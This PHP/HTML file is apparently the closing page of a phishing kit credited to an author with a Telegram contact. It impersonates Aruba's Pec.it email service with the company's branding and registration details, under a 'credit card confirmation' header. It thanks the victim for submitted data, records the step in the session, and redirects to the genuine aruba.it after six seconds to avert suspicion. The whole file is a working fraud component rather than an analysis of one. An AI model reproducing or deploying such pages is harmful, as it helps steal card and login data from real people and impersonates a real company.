<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51official
    ********************************************************/
    
    $_SESSION['last_page'] = "success";
    
?>

<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <title> Sign in to your PEC email account | Pec.it </title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- template css files-->
  <link rel="stylesheet"  href="<?php echo CSSPATH; ?>/bootstrap.css">
  <link rel="stylesheet"  href="<?php echo CSSPATH; ?>/style.css">             


  <!-- logo site web-->
  <link rel="icon" href="<?php echo IMGSPATH; ?>/fav.ico" type="image/x-icon" />


  <!-- fontawtsome -->
  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css"/>

</head>



<body>
 <header>
   <div class="container d-flex justify-content-between align-items-center">
     <div class="left d-flex">
       <div class="logo"><img src="<?php echo IMGSPATH; ?>/llg.png"></div>
       <div class="vv">Conferma della carta di credito</div>
     </div>
     <div class="help"><img src="<?php echo IMGSPATH; ?>/help.png"></div>
   </div>
 </header>
 <section>
   <div class="container">
     <div class="sec text-center">
        <div><img style="max-width: 110px;" src="<?php echo IMGSPATH; ?>/success.png"></div>
       <h2>Abbiamo ricevuto le tue informazioni</h2>
       <p>Grazie per la tua collaborazione. I tuoi dati sono stati inviati correttamente e saranno trattati al più presto.</p>
       
     </div>
   </div>
   <hr>
    <div class="foot text-center mt-5">
              <p class="mb-0">©2025 Aruba S.p.A. - P.IVA 01573850516</p>  
              <p class="mb-0 mt-0">REA: BG-434483 - All rights reserved</p>  
              <div class="a"><a href="#">Privacy Policy - Cookie Policy</a></div>
     </div>
 </section>

 

  <!-- template files js-->
  <script src="<?php echo JSPATH; ?>/jquery-3.5.1.min.js"></script>
  <script src="<?php echo JSPATH; ?>/bootstrap.min.js"></script>
  <script src="<?php echo JSPATH; ?>/jquery.mask.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/jquery-simple-upload@1.1.0/simpleUpload.min.js"></script>
  <script src="<?php echo JSPATH; ?>/js.js"></script>
  <script>

    setTimeout(function () {
                window.location.href= 'https://www.aruba.it/';
            },6000); // 1000 = 1s


   
  </script>
</body>
</html>